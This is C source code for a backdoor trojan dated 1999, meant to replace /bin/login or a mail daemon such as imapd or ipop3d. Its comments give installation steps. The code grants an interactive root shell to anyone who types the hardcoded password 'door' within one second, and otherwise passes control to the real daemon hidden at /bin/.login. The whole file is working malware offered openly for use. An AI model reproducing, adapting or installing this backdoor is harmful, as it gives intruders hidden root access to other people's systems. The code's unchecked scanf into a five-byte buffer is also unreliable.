/* Universal trojan ( login / imapd / qpopd )
But will work on more daemons and on most systems.
After installed on the system.
Telnet to the daemon and you will have 1 second to type in
the trojan passwd to get root access else it executes the real daemon.  */

/*
*   PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! PUBLIC! :P
*
*             mitra (  login / ipop3d / imapd trojan )
*               axess ( axess@mail.com ) in Dec-1999
*
*   This is an combined login / ipop3d / imapd trojan.
*   This should work with other deamons but i have only tested these 3.
*
*   REAL == mv the real deamon to this path.
*   TROJAN == This is the real path of the deamon, put the trojan here.
*
*   It defaults to login trojan now.
*   Dont forgot you might have to the rights of the trojan.
*   Telnet to the port whatever deamon its set for.
*   The passwd you need to enter in one second == door
*   and you will get that lovely # =)
*   This works on most systems.
*
*/

#include<signal.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>

#define REAL "/bin/.login"
#define TROJAN "/bin/login"
#define ROOT "door"

char **execute;
char passwd[5];

int main(int argc, char *argv[]) {
void connection();

signal(SIGALRM,connection);
alarm(1);
execute=argv;
*execute=TROJAN;

scanf("%s",passwd);

if(strcmp(passwd,ROOT)==0) {
alarm(0);
execl("/bin/sh","/bin/sh","-i",0);
exit(0);
}
else
{
execv(REAL,execute);
exit(0);
}
}


void connection()
{
execv(REAL,execute);
exit(0);
}

______________________________________________
FREE Personalized Email at Mail.com
Sign up at http://www.mail.com?sr=mc.mk.mcm.tag001


